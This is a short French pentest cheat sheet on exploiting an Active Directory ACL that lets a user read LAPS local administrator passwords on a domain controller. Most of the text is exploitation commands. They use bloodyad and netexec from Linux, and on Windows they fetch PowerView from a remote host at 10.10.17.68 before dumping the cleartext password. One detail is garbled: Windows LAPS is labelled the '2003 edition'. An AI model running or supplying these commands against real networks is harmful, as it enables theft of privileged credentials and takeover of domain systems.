Cette ACL permet d'obtenir la lecture du Local Administrator Password Solution sur le DC01 concerné.

Pour des systèmes utilisant legacy LAPS, L'ad peut fournir les informations suivantes : 
  - **ms-Mcs-AdmPwd** : le LAPS password en clair
  - **ms-Mcs-AdmPwdExpirationTime** : le temps d'expiration du LAPS password

Pour des systèmes utilisant Windows LAPS (2003 edition)
  - **msLAPS-Password** : le LAPS password en clair
  - **msLAPS-PasswordExpirationTime** : le temps d'expiration du LAPS password


### Exploitation
#### Sur Linux 
```bash 
bloodyad --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps

```

#### Sur Windows
```powershell
# Importer PowerView.ps1 sur la machine cible
Invoke-WebRequest http://10.10.17.68:8000/PowerView.ps1 -OutFile C:\Temp\PowerView.ps1 
Import-Module .\PowerView.ps1

# Obtenir les informations sous différents format
Get-DomainComputer DC01 -Properties "ms-Mcs-Admpwd"
Get-DomainComputer DC01 -Properties "cn","ms-Mcs-Admpwd","ms-Mcs-AdmPwdExpirationTime"

Get-LapsADPassword "DC01" -AsPlainText
```
